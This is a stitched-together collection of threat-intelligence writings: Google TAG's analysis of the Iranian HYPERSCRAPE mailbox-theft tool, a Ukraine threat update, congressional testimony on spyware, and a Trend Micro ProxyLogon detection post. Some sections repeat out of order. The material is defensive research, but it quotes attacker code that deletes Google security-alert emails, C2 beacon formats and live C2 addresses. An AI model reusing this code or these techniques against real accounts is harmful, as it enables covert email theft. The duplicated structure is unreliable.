"When they are received, the browser navigates to the official Takeout link to request and eventually download the exported data."
"public void ManageTakeOut() { string text = ""PipeName"";"
"Process process = new Process(); process.StartInfo.Arguments = string.Format(""PIPE Google \""{0}\"""", text); process.StartInfo.FileName = Process.GetCurrentProcess().MainModule.FileName; process.Start();"
"PipeCommunication pipeCommunication = new PipeCommunication(true, text); bool flag = false; while (!flag)"
{ try { JsonInfo jsonInfo = pipeCommunication.Read(); switch (jsonInfo.Type) { case JsonType.GetCookies: jsonInfo.Data = this.CookieText; pipeCommunication.Write(jsonInfo); break; case JsonType.TakeOutFile: flag = true; break; case JsonType.GetUsername: while (this.OperationObject.GetUsername() == null) { Thread.Sleep(1000); }
jsonInfo.Data = this.OperationObject.GetUsername(); pipeCommunication.Write(jsonInfo); break; } }
catch (Exception) { bool hasExited = process.HasExited; if (hasExited) { flag = true; } }
pipeCommunication.Close(); }
"TAG is committed to sharing research to raise awareness on bad actors like Charming Kitten within the security community, and for companies and individuals that may be targeted."
It’s why we do things like work with our CyberCrime Investigation Group to share critical information relevant to law enforcement.
We hope doing so will improve understanding of tactics and techniques that will enhance threat hunting capabilities and lead to stronger protections across the industry.
We’ll also continue to apply those findings internally to improve the safety and security of our products so we can effectively combat threats and protect users who rely on our services.
"In the meantime, we encourage high risk users to enroll in our Advanced Protection Program (APP) and utilize Google Account Level Enhanced Safe Browsing to ensure they have the greatest level of protection in the face of ongoing threats."
C2s 136.243.108.14 173.209.51.54 HYPERSCRAPE binaries
03d0e7ad4c12273a42e4c95d854408b98b0cf5ecf5f8c5ce05b24729b6f4e369 35a485972282b7e0e8e3a7a9cbf86ad93856378fd96cc8e230be5099c4b89208 5afc59cd2b39f988733eba427c8cf6e48bd2e9dc3d48a4db550655efe0dca798 6dc0600de00ba6574488472d5c48aa2a7b23a74ff1378d8aee6a93ea0ee7364f 767bd025c8e7d36f64dbd636ce0f29e873d1e3ca415d5ad49053a68918fe89f4 977f0053690684eb509da27d5eec2a560311c084a4a133191ef387e110e8b85f ac8e59e8abeacf0885b451833726be3e8e2d9c88d21f27b16ebe00f00c1409e6 cd2ba296828660ecd07a36e8931b851dda0802069ed926b3161745aae9aa6daa Microsoft Live DLL 1a831a79a932edd0398f46336712eff90ebb5164a189ef38c4dacc64ba84fe23 PDB E:\Working\Projects\EmailDownloader\EmailDownloaderCookieMode\EmailDownloader\obj\Debug\EmailDownloader.pdb E:\Working\Projects\EmailDownloader\EmailDownloaderCookieMode\Mahdi\LiveLib\obj\Release\LiveLib.pdb
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q2 2022.
"It was last updated on July 29, 2022."
"The following testimony was delivered to the U.S. House Intelligence Committee by Shane Huntley, Senior Director of Google’s Threat Analysis Group (TAG) on July 27, 2022. Chairman Schiff, Ranking Member Turner, and esteemed Members of the Committee: Thank you for the opportunity to appear before the Committee to discuss Google’s efforts to protect users from commercial spyware."
"We appreciate the Committee’s efforts to raise awareness about the commercial spyware industry that is thriving and growing, creating risks to Americans and Internet users across the globe."
"Google has been tracking the activities of commercial spyware vendors for years, and we have been taking critical steps to protect our users."
"We take the security of our users very seriously, and we have dedicated teams in place to protect against attacks from a wide range of sources."
"Our Threat Analysis Group, or TAG, is dedicated to protecting users from threats posed by state-sponsored malware attacks and other advanced persistent threats."
TAG actively monitors threat actors and the evolution of their tactics and techniques.
"For example, TAG has been closely tracking and disrupting campaigns targeting individuals and organizations in Ukraine, and frequently publishes reports on Russian threat actors."
We use our research to continuously improve the safety and security of our products and share this intelligence with our industry peers.
"We also publicly release information about the operations we disrupt, which is available to our government partners and the general public."
"TAG tracks and proactively counters serious state-sponsored and financially motivated information cyber criminal activities, such as hacking and the use of spyware."
And we don’t just plug security holes – we work to eliminate entire classes of threats for consumers and businesses whose work depends on the Internet.
"We are joined in this effort by many other security teams at Google, including Project Zero, our team of security researchers at Google who study zero-day vulnerabilities in the hardware and software systems that are depended upon by users around the world."
Google has a long track record combating commercial surveillance tools targeting our users.
"In 2017, Android – which is owned by Google – was the first mobile platform to warn users about NSO Group’s Pegasus spyware."
"At the time, our Android team released research about a newly discovered family of spyware related to Pegasus that was used in a targeted attack on a small number of Android devices."
We observed fewer than three dozen installs of this spyware.
We remediated the compromises for these users and implemented controls to protect all Android users.
NSO Group continues to pose risks across the Internet ecosystem.
"In 2019, we confronted the risks posed by NSO Group again, relying upon NSO Groups’s marketing information suggesting that they had a 0-day exploit for Android."
Google was able to identify the vulnerability in use and fix the exploit quickly.
"In December 2021, we released research about novel techniques used by NSO Group to compromise iMessage users."
"iPhone users could be compromised by receiving a malicious iMessage text, without ever needing to click a malicious link."
"Short of not using a device, there is no way to prevent exploitation by a zero-click exploit; it's a weapon against which there is no defense."
"Based on our research and findings, we assessed this to be one of the most technically sophisticated exploits we had ever seen, further demonstrating that the capabilities NSO provides rival those previously thought to be accessible to only a handful of nation states."
"Although this Committee must be concerned with the exploits of NSO Group, it is not the only entity posing risks to our users."
"For example, TAG discovered campaigns targeting Armenian users which utilized zero-day vulnerabilities in Chrome and Internet Explorer."
We assessed that a surveillance vendor packaged and sold these technologies.
"Reporting by CitizenLab linked this activity to Candiru, an Israeli spyware vendor."
"Other reporting from Microsoft has linked this spyware to the compromise of dozens of victims, including political dissidents, human rights activists, journalists, and academics."
"Most recently, we reported in May on five zero-day vulnerabilities affecting Chrome and Android which were used to compromise Android users."
"We assess with high confidence that commercial surveillance company Cytrox packaged these vulnerabilities, and sold the hacking software to at least eight governments."
"Among other targets, this spyware was used to compromise journalists and opposition politicians."
Our reporting is consistent with earlier analysis produced by CitizenLab and Meta.
TAG also recently released information on a segment of attackers we call “hack-for-hire” that focuses on compromising accounts and exfiltrating data as a service.
"In contrast to commercial surveillance vendors, who we generally observe selling a capability for the end user to operate, hack-for-hire firms conduct attacks themselves."
They target a wide range of users and opportunistically take advantage of known security flaws when undertaking their campaigns.
"In June, we provided examples of the hack-for-hire ecosystem from India, Russia, and the United Arab Emirates."
The growth of commercial spyware vendors and hack-for-hire groups has necessitated growth in TAG to counter these threats.
"Where once we only needed substreams to focus on threat actors such as China, Russia, and North Korea, TAG now has a dedicated analysis subteam dedicated to commercial vendors and operators."
Our findings underscore the extent to which commercial surveillance vendors have proliferated capabilities historically only used by governments.
These vendors operate with deep technical expertise to develop and operationalize exploits.
"We believe its use is growing, fueled by demand from governments."
Seven of the nine zero-day vulnerabilities our Threat Analysis Group discovered in 2021 were originally developed by commercial providers and sold to and used by state-sponsored actors.
TAG is actively tracking more than 30 vendors with varying levels of sophistication and public exposure selling exploits or surveillance capabilities to state-sponsored actors.
This industry appears to be thriving.
"These vendors are enabling the proliferation of dangerous hacking tools, arming nation state actors that would not otherwise be able to develop these capabilities in-house."
"While use of surveillance technologies may be legal under national or international laws, they are found to be used by some state actors for purposes antithetical to democratic values: targeting dissidents, journalists, human rights workers, and opposition party politicians."
We have also observed proliferation risk from nation state actors attempting to gain access to the exploits of these vendors.
"Last year, TAG identified an ongoing campaign targeting security researchers working on vulnerability research and development at different companies and organizations."
"The actors behind this campaign, which we attributed to a government-backed entity based in North Korea, have employed a number of means to target researchers."
"In addition to these concerns, there are other reasons why this industry presents a risk more broadly across the Internet."
"While vulnerability research is an important contributor to online safety when that research is used to improve the security of products, vendors stockpiling zero-day vulnerabilities in secret can pose a severe risk to the Internet when the vendor itself gets compromised."
"This has happened to multiple spyware vendors over the past ten years, raising the specter that their stockpiles can be released publicly without warning."
"The proliferation of commercial hacking tools is a threat to national security, making the Internet less safe and undermining the trust on which a vibrant, inclusive digital society depends."
"This is why when Google discovers these activities, we not only take steps to protect users, but also disclose that information publicly to raise awareness and help the entire ecosystem, in line with our historical commitment to openness and democratic values."
"Across all Google products, we incorporate industry-leading security features and protections to keep our users safe."
"On Search, Google’s Safe Browsing is an industry-leading service to identify unsafe websites across the web and notify users and website owners of potential harm."
Google Safe Browsing helps protect over four billion devices every day by showing warnings to users when they attempt to navigate to unsafe sites or download harmful files.
Safe Browsing also notifies webmasters when their websites are compromised by malicious actors and helps them diagnose and resolve the problem so that their visitors stay safer.
"On Gmail, we recommend certain Gmail security precautions to prevent spoofing, phishing, and spam."
Spoofers may send forged messages using an organization’s real name or domain to subvert authentication measures.
"We use email authentication to protect against email spoofing, which is when email content is changed to make the message appear from someone or somewhere other than the actual source."
And we offer other advanced phishing and malware protection to administrators to better protect their users.
"By default, Gmail displays warnings and moves untrustworthy emails to the user’s spam folder."
However administrators can also use advanced security settings to enhance their users’ protection against suspicious attachments and scripts from untrusted senders.
"For Android, through its entire development lifecycle, we subject the products to a rigorous security program."
"The Android security process begins early in the development lifecycle, and each major feature of the platform is reviewed by engineering and security resources."
We ensure appropriate controls are built into the architecture of the system.
"During the development stage, Android-created and open source components are subject to vigorous security reviews"
"For users, Android provides safety and control over how apps and third parties can access the data from their devices."
"For example, users are provided visibility into the permissions requested by each app, and they are able to control those permissions."
We have also built additional tools to prevent successful attacks on devices that run Android once those devices are in users’ hands.
"For example, Google Play Protect, our built-in malware protection for Android, continuously scans devices for potentially harmful applications."
"Although our security precautions are robust, security issues can still occur, which is why we created a comprehensive security response process to respond to incidents."
"Google manages a vulnerability rewards program (VRP), rewarding researchers millions of dollars for their contributions in securing our devices and platforms."
We also provide research grants to security researchers to help fund and support the research community.
"This is all part of a larger strategy to keep Google products and users, as well as the Internet at large more secure."
"Project Zero is also a critical component of this strategy, pushing transparency and more timely patching of vulnerabilities."
"Finally, we also offer the leading tools to protect important civil society actors such as journalists, human rights workers, opposition party politicians, and campaign organizations – in other words, the users who are frequently targeted by surveillance tools."
"Google developed Project Shield, a free protection against distributed denial of service (DDoS) attacks, to protect news media and human rights organization websites."
"We recently expanded eligibility to protect Ukraine government organizations, and we are currently protecting over 200 Ukraine websites today."
"To protect high risk user accounts, we offer the Advanced Protection Program (APP), which is our highest form of account security."
"APP has a strong track record protecting users – since the program’s inception, there are no documented cases of an account compromise via phishing."
"We believe it is time for government, industry and civil society to come together to change the incentive structure which has allowed these technologies to spread in secret."
The first step is to understand the scope of the problem.
"We appreciate the Committee’s focus on this issue, and recommend the U.S. Intelligence Community prioritize identifying and analyzing threats from foreign commercial spyware providers as being on par with other major advanced threat actors."
The U.S. could also set an example to other governments by reviewing and disclosing its own historical use of these tools.
"We welcome recent steps taken by the government in applying sanctions to the NSO Group and Candiru, and we believe other governments should consider expanding these restrictions."
"Additionally, the U.S. government should consider a full ban on Federal procurement of commercial spyware technologies and contemplate imposing further sanctions to limit spyware vendors’ ability to operate in the U.S. and receive U.S. investment."
"The harms from this industry are amply evident by this point, and we believe they outweigh any benefit to continued use."
Any one government’s ability to meaningfully impact this market is limited; only through a concerted international effort can this serious risk to online safety be mitigated.
Google is investing heavily as a company and as an industry to counter serious threats to our users.
"In the modern world, we must be able to trust the devices we use every day and ensure that foreign adversaries do not have access to sophisticated exploits."
"While we continue to fight these threats on a technical level, the providers of these capabilities operate openly in democratic countries."
Google is committed to leading the industry in detecting and disrupting these threats.
I thank the Committee for this attention on this critical issue.
Google’s Threat Analysis Group (TAG) continues to closely monitor the cybersecurity environment in Eastern Europe with regard to the war in Ukraine.
"Many Russian government cyber assets have remained focused on Ukraine and related issues since the invasion began, while Russian APT activity outside of Ukraine largely remains the same."
"TAG continues to disrupt campaigns from multiple sets of Russian government-backed attackers, some of which are detailed in our previous updates."
"Similarly, Russian observed disinformation efforts are also focused on the war in Ukraine and TAG has disrupted coordinated influence operations from several actors including the Internet Research Agency and a Russian consulting firm as detailed in the TAG Bulletin."
"Here is a deeper look at some campaign activity TAG has observed since our last update: Turla, a group publicly attributed to Russia’s Federal Security Service (FSB), recently hosted Android apps on a domain spoofing the Ukrainian Azov Regiment."
This is the first known instance of Turla distributing Android-related malware.
"The apps were not distributed through the Google Play Store, but hosted on a domain controlled by the actor and disseminated via links on third party messaging services."
We believe there was no major impact on Android users and that the number of installs was miniscule.
The app is distributed under the guise of performing Denial of Service (DoS) attacks against a set of Russian websites.
"However, the 'DoS' consists only of a single GET request to the target website, not enough to be effective."
The list of target websites for the app can be seen in the CyberChef recipe here.
"During our investigation into the Turla CyberAzov apps, we identified another Android app first seen in the wild in March 2022 that also claimed to conduct DoS attacks against Russian websites."
"In this case, the Android app name was stopwar.apk (com.ddos.stopwar) and was distributed from the website stopwar.pro."
This app is quite different from the Turla apps described above and written by a different developer.
"It also downloads a list of targets from an external site, but unlike the Turla apps, it continually sends requests to the target websites until it is stopped by the user."
"Based on our analysis, we believe that the StopWar app was developed by pro-Ukrainian developers and was the inspiration for what Turla actors based their fake CyberAzov DoS app off of."
"Indicators: The Follina vulnerability (CVE-2022-30190), first disclosed in late May, received significant usage from both APT and cybercrime groups throughout June after it was patched by Microsoft."
Follina is a remote code execution (RCE) vulnerability in the Microsoft Windows Support Diagnostic Tool (MSDT).
"Consistent with CERT-UA reporting, TAG observed multiple Russian GRU actors - APT28 and Sandworm - conduct campaigns exploiting the Follina vulnerability."
"The Sandworm campaign used compromised government accounts to send links to Microsoft Office documents hosted on compromised domains, primarily targeting media organizations in Ukraine."
TAG has also observed an increasing number of financially motivated actors targeting Ukraine.
"One recent campaign from a group tracked by CERT-UA as UAC-0098 delivered malicious documents with the Follina exploit in password-protected archives, impersonating the State Tax Service of Ukraine."
"We assess this actor is a former initial ransomware access broker who previously worked with the Conti ransomware group distributing the IcedID banking trojan based on overlaps in infrastructure, tools used in previous campaigns, and a unique cryptor."
"Ghostwriter/UNC1151, a threat actor attributed to Belarus, has remained active targeting accounts of webmail and social media networks of Polish users."
They continue to use the 'Browser in the Browser' phishing technique that TAG first observed and described in March.
"An example of this technique, used to target Facebook users, can be seen in the screenshot below."
"COLDRIVER, a Russian-based threat actor sometimes referred to as Callisto, continues to send credential phishing emails to targets including government and defense officials, politicians, NGOs and think tanks, and journalists."
"In addition to including phishing links directly in the email, the attackers also link to PDFs and/or DOCs, hosted on Google Drive and Microsoft One Drive, that contain a link to an attacker-controlled phishing domain."
These phishing domains have been blocked through Google Safe Browsing – a service that identifies unsafe websites across the web and notifies users and website owners of potential harm.
Recently observed COLDRIVER indicators: In another campaign tracked by CERT-UA as UAC-0056 we observed compromised email addresses of a Regional Prosecutor’s office of Ukraine leveraged to send malicious Microsoft Excel documents with VBA macros delivering Cobalt Strike.
"In just two days, the volume observed and categorized as spam by Gmail exceeded 4,500 emails."
Last March it seemed the world came to a stand-still as the COVID-19 pandemic begin to rapidly spread.
"While businesses, sporting events, and schools started shutting down, cybercriminals remained active as ever."
"In 2020, the Trend Micro Zero Day Initiative™ (ZDI) published 1,453 advisories, the most ever in the history of the program."
More startling is the fact that 18.6% of all disclosures were published without a fix from the vendor—another record-breaking stat.
"As ZDI predicted, 2021 continued to be a busy year."
"In March 2021, Microsoft kicked off the patch cycle early after releasing an advisory regarding the mass exploitation of four zero-days vulnerabilities by a Chinese Hacking group, HAFNIUM, on the on-premises versions of the Microsoft Exchange Server."
"In the following days of the attack, Trend Micro reported that at least 30,000 organizations were thought to have been attacked in the US, and 63,000 servers remained exposed to these exploits."
"The vulnerability has been dubbed as ProxyLogon by the researchers at DEVCORE, who are credited with finding the bugs in the proxy architecture and the logon mechanism of Exchange."
DEVCORE reported two of the four zero-days (CVE-2021-26855 and CVE-2021-27065) to Microsoft Security Response Center (MSRC).
"On March 2, Volexity reported in-the-wild exploitation of the vulnerabilities, to which DEVCORE confirmed that the exploit observed by Volexity was the one submitted to MSRC."
"Since then, there has been opportunistic exploitation by various threat actors and ransomware groups (Dearcry, BlackKingdom) since majority of Outlook Web App portals are public and indexed by search engines like Google Search, Shodan, Binaryedge, Censys, Zoomeye etc."
"According to Shodan, on March 4, there were more than 266,000 Exchange Servers vulnerable to the ProxyLogon vulnerability, a day after the patch was released."
Fig - Shodan Results
"In lieu of these exploits, let’s take a look at how Trend Micro Vision One™ and Trend Micro Cloud One™ can provide protection against two of the four zero-days, CVE-2021-26855 and CVE-2021-27065."
Overview:
"Two bugs are chained to achieve the remote code execution and for the attack to be successful, an attacker requires access to the Outlook Web App portal of the vulnerable Exchange Server, and a valid email address"
CVE-2021-26855: Microsoft Exchange Server Remote Code Execution Vulnerability (pre-authenticated Server-Side Request Forgery [SSRF]) CVE-2021-27065: Microsoft Exchange Server Remote Code Execution Vulnerability (post-authenticated Arbitrary File Write) Fig - MS Exchange Client Access Protocol Architecture The Client Access services (Outlook Web App portal) proxies the incoming connections to the Backend services.
"As per the Exchange documentation, clients don’t directly connect to the backend services."
"But because of the SSRF vulnerability, attackers can query the internal backend services and APIs on the Exchange Server, bypassing the frontend proxy."
"By abusing the SSRF, attackers can create session IDs and access tokens for privileged accounts with the context of the Exchange Control Panel, which can be used to write files with attacker-controlled content at a location on the target server, chosen by the attacker."
"Since Exchange depends on Internet Information Services (IIS) webserver, an attacker can write ASPX webshells and run arbitrary commands as SYSTEM on the Exchange Server. In January 2021, we came across extensive use of Chopper ASPX webshells in targeted attacks by malicious actors to establish persistence and a foothold on the public-facing Outlook Web App servers. Trend Micro Cloud One™ – Workload Security Correlation:"
Trend Micro Cloud One™ – Workload Security is a cloud-native solution that provides automated security via powerful APIs.
"Security as code allows DevOps teams to bake security into their build pipeline to release continuously and frequently, so developers like yourself, can keep working without disruption from security."
"Workload Security uses advanced security controls such as intrusion prevention system (IPS), deep packet inspection (DPI), and integrity monitoring to protect Exchange Servers from attackers that could exploit ProxyLogon."
The following detection rules safeguard a vulnerable Exchange Server from the CVEs reported: Intrusion Prevention System detections: 1010854 - Microsoft Exchange Server Remote Code Execution Vulnerability (CVE-2021-26855) 1010868 - Microsoft Exchange Server Remote Code Execution Vulnerability (CVE-2021-27065) 1010870 - Microsoft Exchange Server Remote Code Execution Vulnerability (CVE-2021-27065) – 1 1007170 - Identified Suspicious China Chopper Webshell Communication (ATT&CK T1100) 1005934 - Identified Suspicious Command Injection Attack Integrity Monitoring detections: 1010855 - Microsoft Exchange - HAFNIUM Targeted Vulnerabilities 1010854 - Microsoft Exchange Server Remote Code Execution Vulnerability (CVE-2021-26855) 1007170 - Identified Suspicious China Chopper Webshell Communication (ATT&CK T1100) 1010870 - Microsoft Exchange Server Remote Code Execution Vulnerability (CVE-2021-27065) - 1 1005934 - Identified Suspicious Command Injection Attack
"IM Rules: 1010855 - Microsoft Exchange - HAFNIUM Targeted Vulnerabilities Trend Micro Vision One™ Correlation: Fig - Microsoft Exchange Server RCE Vulnerability (CVE-2021-26855 + CVE-2021-27065) Trend Micro Vision One™ is a purpose-built, threat defense platform with extended detection and response (XDR) capabilities that work to prevent majority of attacks with automated protection."
"The solution allows you to see more and respond faster by collecting and correlating data across email, endpoints, servers, cloud workloads, and networks."
"Using the Trend Micro Vision One Workbench, you can easily see what threats were detected, attack techniques, and a prioritized list of risky devices and users."
"With Trend Micro Vision One, we ran a public proof of concept (PoC) available online exploiting the ProxyLogon vulnerability."
The above image shows the vulnerability detected and all the assets related to the alert for further investigation.
Let’s take a deeper look:
Fig - Potential Chopper Webshell Detection
"The Potential Chopper Webshell Execution model triggers when the web shell is already present on the machine and is being used as a backdoor to run commands as SYSTEM on the Exchange Server using China Chopper. The metrics provided by this model should be investigated carefully, since the ProxyLogon zero-day vulnerability was exploited in-the-wild, before Microsoft addressed the issue publicly."
Microsoft has since taken things a step further by creating patches for out-of-support versions of Exchange.
"Overall, Microsoft released patches for 89 unique CVEs in March—14 of which were listed as Critical and 75 listed as Important in severity."
Fig - Microsoft Exchange Server Possible ASPX Web Shell The above model triggers when a new web shell is created.
You can see the path and name of the web shell.
Fig - Potential Chopper Webshell Execution Fig - Identified Suspicious China Chopper Webshell Communication Fig - Possible Credential Dumping via Command Line
This model is triggered when an attacker fetches the credentials using a command-line from within the memory using Mimikatz.
"Since the web shell runs as the SYSTEM user, an attacker can fetch the NT LAN Manager (NTLM) hashes of the logged-in users, create or delete accounts, and perform extensive post-exploitation activities on the Exchange Server. Figure - Executing Mimikatz as SYSTEM using CC Fig - System Owner User Discovery The above event was triggered when we ran whoami from within the Chopper web shell."
"Since requests to the ASPX web shell are handled by the privileged w3wp.exe, an IIS Worker Process in the configured IIS application pool (Microsoft Exchange App pool) runs the commands in the context of NT Authority\SYSTEM user."
RCA Diagrams: Fig. Executing commands using Chopper CnC Conclusion
There is no silver bullet when it comes to cybersecurity but using solutions that bake into your development pipeline to provide security as early as possible is better than scrambling for patches after deployment.
Quick and easy to deploy solutions like Trend Micro Cloud One and Trend Micro Vision One can provide you with SecOps-approved security from build-time to runtime without slowing you down.
Imagine that!
"Tags Cloud | APT & Targeted Attacks | Expert Perspective | Exploits & Vulnerabilities | Articles, News, Reports"
"As part of TAG's mission to counter serious threats to Google and our users, we've analyzed a range of persistent threats including APT35 and Charming Kitten, an Iranian government-backed group that regularly targets high risk users."
"For years, we have been countering this group’s efforts to hijack accounts, deploy malware, and their use of novel techniques to conduct espionage aligned with the interests of the Iranian government."
"Now, we’re shining light on a new tool of theirs."
"In December 2021, TAG discovered a novel Charming Kitten tool, named HYPERSCRAPE, used to steal user data from Gmail, Yahoo!, and Microsoft Outlook accounts."
The attacker runs HYPERSCRAPE on their own machine to download victims’ inboxes using previously acquired credentials.
"The oldest known sample is from 2020, and the tool is still under active development."
We have taken actions to re-secure these accounts and have notified the victims through our Government Backed Attacker Warnings.
"This post will provide technical details about HYPERSCRAPE, similar to PWC’s recently published analysis on a Telegram grabber tool."
HYPERSCRAPE demonstrates Charming Kitten’s commitment to developing and maintaining purpose-built capabilities.
"Like much of their tooling, HYPERSCRAPE is not notable for its technical sophistication, but rather its effectiveness in accomplishing Charming Kitten’s objectives."
"HYPERSCRAPE requires the victim’s account credentials to run using a valid, authenticated user session the attacker has hijacked, or credentials the attacker has already acquired."
"It spoofs the user agent to look like an outdated browser, which enables the basic HTML view in Gmail."
"Once logged in, the tool changes the account’s language settings to English and iterates through the contents of the mailbox, individually downloading messages as .eml files and marking them unread."
"After the program has finished downloading the inbox, it reverts the language back to its original settings and deletes any security emails from Google."
"Earlier versions contained the option to request data from Google Takeout, a feature which allows users to export their data to a downloadable archive file."
The tool is written in .NET for Windows PCs and is designed to run on the attacker's machine.
"We tested HYPERSCRAPE in a controlled environment with a test Gmail Account, although functionality may differ for Yahoo! and Microsoft accounts."
HYPERSCRAPE won't run unless in a directory with other file dependencies.
"When launched, the tool makes an HTTP GET request to a C2 to check for a response body of ""OK'' and will terminate if it's not found."
"In the version tested, the C2 was unobfuscated and stored as a hardcoded string."
In later versions it was obfuscated with Base64.
GET http://{C2}/Index.php?Ck=OK HTTP/1.1
Host: {C2}
Accept-Encoding: gzip Connection: Keep-Alive
"The tool accepts arguments from the command line such as the mode of operation, an identifier string, and a path string to a valid cookie file."
A new form is displayed if the information is not provided via command prompt.
"Once provided, the data in the ""Identity"" field is sent to a C2 for confirmation."
"Again, the response is expected to be ""OK""."
GET http://{C2}/Index.php?vubc={identity} HTTP/1.1
Host: {C2} Accept-Encoding: gzip
"If the cookie file path was not supplied via the command line, a new form will allow the operator to do so using drag and drop."
"After parsing, the cookies are inserted into a local cache used by the embedded web browser."
"A new folder named ""Download"" is created adjacent to the main binary."
The browser then navigates to Gmail to begin the data collection.
"The user agent is spoofed so it appears like an outdated browser, which results in an error message and allows the attacker to enable the basic HTML view in Gmail."
"If the cookies failed to provide access to the account, a login page is displayed and the attacker can manually enter credentials to proceed, as the program will wait until it finds the inbox page."
"Once the attacker has logged in to the victim’s account, HYPERSCRAPE checks to see if the language is set to English, changing it if not."
The language is returned to its original setting when the run is finished.
HYPERSCRAPE then begins iterating through all available tabs in the inbox looking for emails to download.
"It does the following for each email found: The emails are saved with "".eml"" extensions under the Downloads directory with the filename corresponding to the subject."
A log file is written containing a count of the emails that were downloaded.
"When finished, a HTTP POST request is made to the C2 to relay the status and system information."
The downloaded emails are not sent to the C2.
"POST http://{C2}/?Key={GUID}&Crc={Identifier} { ""appName"": ""Gmail Downloader"", ""targetname"": ""{Email}"", ""HostName"": ""REDACTED"", ""srcUserIP"": ""REDACTED"", ""actionType"": ""First"", ""timeOccurrence"": ""05/01/2022 05:50:31 PM"", ""OS"": ""REDACTED"", ""OSVersion"": ""REDACTED"", ""SystemModel"": ""REDACTED"", ""SystemType"": ""REDACTED"", ""srcName"": ""REDACTED"", ""srcOrgName"": ""REDACTED"" }"
The program will delete any security emails from Google generated by the attacker’s activity.
"private bool IsThereAnyEMail() { List < GeckoHtmlElement > list = (from x in this.geckoWebBrowser.Document.GetElementsByTagName(""span"") where x.TextContent.StartsWith (""Security alert"") || x.TextContent.StartsWith(""Archive of Google data requested"") || x.TextContent.StartsWith(""Your Google data archive is ready"") || x.TextContent.StartsWith(""Your Google data is ready"") || x.TextContent.StartsWith(""Critical security alert"") ||"
"x.TextContent.StartsWith(""Access for less secure apps has been turned on"") ||"
"x.TextContent.StartsWith(""Review blocked sign-in attempt"") || x.TextContent."
"StartsWith(""Help us protect you: Security advice from Google"")"
"x.TextContent.StartsWith(""Access for less secure apps has been turned on"") select x).ToList"
GeckoHtmlElement > (
; bool flag = list.Count == 0; return !flag; }
"Data from Google Takeout is also available upon request, but the option was only found in early builds."
The functionality was not automated and it's unclear why it was removed in later versions.
"When conducting a Takeout, the program will spawn a new copy of itself and initialize a pipe communication channel to relay the cookies and account name, both of which are required to accomplish the Takeout."
"When they are received, the browser navigates to the official Takeout link to request and eventually download the exported data."
"public void ManageTakeOut() { string text = ""PipeName"";"
"Process process = new Process(); process.StartInfo.Arguments = string.Format(""PIPE Google \""{0}\"""", text); process.StartInfo.FileName = Process.GetCurrentProcess().MainModule.FileName; process.Start();"
"PipeCommunication pipeCommunication = new PipeCommunication(true, text); bool flag = false; while (!flag)"
{ try { JsonInfo jsonInfo = pipeCommunication.Read(); switch (jsonInfo.Type) { case JsonType.GetCookies: jsonInfo.Data = this.CookieText; pipeCommunication.Write(jsonInfo); break; case JsonType.TakeOutFile: flag = true; break; case JsonType.GetUsername: while (this.OperationObject.GetUsername() == null) { Thread.Sleep(1000); }
jsonInfo.Data = this.OperationObject.GetUsername(); pipeCommunication.Write(jsonInfo); break; } }
catch (Exception) { bool hasExited = process.HasExited; if (hasExited) { flag = true; } }
pipeCommunication.Close(); }
"TAG is committed to sharing research to raise awareness on bad actors like Charming Kitten within the security community, and for companies and individuals that may be targeted."
It’s why we do things like work with our CyberCrime Investigation Group to share critical information relevant to law enforcement.
We hope doing so will improve understanding of tactics and techniques that will enhance threat hunting capabilities and lead to stronger protections across the industry.
We’ll also continue to apply those findings internally to improve the safety and security of our products so we can effectively combat threats and protect users who rely on our services.
"In the meantime, we encourage high risk users to enroll in our Advanced Protection Program (APP) and utilize Google Account Level Enhanced Safe Browsing to ensure they have the greatest level of protection in the face of ongoing threats."
C2s 136.243.108.14 173.209.51.54 HYPERSCRAPE binaries
03d0e7ad4c12273a42e4c95d854408b98b0cf5ecf5f8c5ce05b24729b6f4e369 35a485972282b7e0e8e3a7a9cbf86ad93856378fd96cc8e230be5099c4b89208 5afc59cd2b39f988733eba427c8cf6e48bd2e9dc3d48a4db550655efe0dca798 6dc0600de00ba6574488472d5c48aa2a7b23a74ff1378d8aee6a93ea0ee7364f 767bd025c8e7d36f64dbd636ce0f29e873d1e3ca415d5ad49053a68918fe89f4 977f0053690684eb509da27d5eec2a560311c084a4a133191ef387e110e8b85f ac8e59e8abeacf0885b451833726be3e8e2d9c88d21f27b16ebe00f00c1409e6 cd2ba296828660ecd07a36e8931b851dda0802069ed926b3161745aae9aa6daa Microsoft Live DLL 1a831a79a932edd0398f46336712eff90ebb5164a189ef38c4dacc64ba84fe23 PDB E:\Working\Projects\EmailDownloader\EmailDownloaderCookieMode\EmailDownloader\obj\Debug\EmailDownloader.pdb E:\Working\Projects\EmailDownloader\EmailDownloaderCookieMode\Mahdi\LiveLib\obj\Release\LiveLib.pdb
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q2 2022.
"It was last updated on July 29, 2022."
"The following testimony was delivered to the U.S. House Intelligence Committee by Shane Huntley, Senior Director of Google’s Threat Analysis Group (TAG) on July 27, 2022. Chairman Schiff, Ranking Member Turner, and esteemed Members of the Committee: Thank you for the opportunity to appear before the Committee to discuss Google’s efforts to protect users from commercial spyware."
"We appreciate the Committee’s efforts to raise awareness about the commercial spyware industry that is thriving and growing, creating risks to Americans and Internet users across the globe."
"Google has been tracking the activities of commercial spyware vendors for years, and we have been taking critical steps to protect our users."
"We take the security of our users very seriously, and we have dedicated teams in place to protect against attacks from a wide range of sources."
"Our Threat Analysis Group, or TAG, is dedicated to protecting users from threats posed by state-sponsored malware attacks and other advanced persistent threats."
TAG actively monitors threat actors and the evolution of their tactics and techniques.
"For example, TAG has been closely tracking and disrupting campaigns targeting individuals and organizations in Ukraine, and frequently publishes reports on Russian threat actors."
We use our research to continuously improve the safety and security of our products and share this intelligence with our industry peers.
"We also publicly release information about the operations we disrupt, which is available to our government partners and the general public."
"TAG tracks and proactively counters serious state-sponsored and financially motivated information cyber criminal activities, such as hacking and the use of spyware."
And we don’t just plug security holes – we work to eliminate entire classes of threats for consumers and businesses whose work depends on the Internet.
"We are joined in this effort by many other security teams at Google, including Project Zero, our team of security researchers at Google who study zero-day vulnerabilities in the hardware and software systems that are depended upon by users around the world."
Google has a long track record combating commercial surveillance tools targeting our users.
"In 2017, Android – which is owned by Google – was the first mobile platform to warn users about NSO Group’s Pegasus spyware."
"At the time, our Android team released research about a newly discovered family of spyware related to Pegasus that was used in a targeted attack on a small number of Android devices."
We observed fewer than three dozen installs of this spyware.
We remediated the compromises for these users and implemented controls to protect all Android users.
NSO Group continues to pose risks across the Internet ecosystem.
"In 2019, we confronted the risks posed by NSO Group again, relying upon NSO Groups’s marketing information suggesting that they had a 0-day exploit for Android."
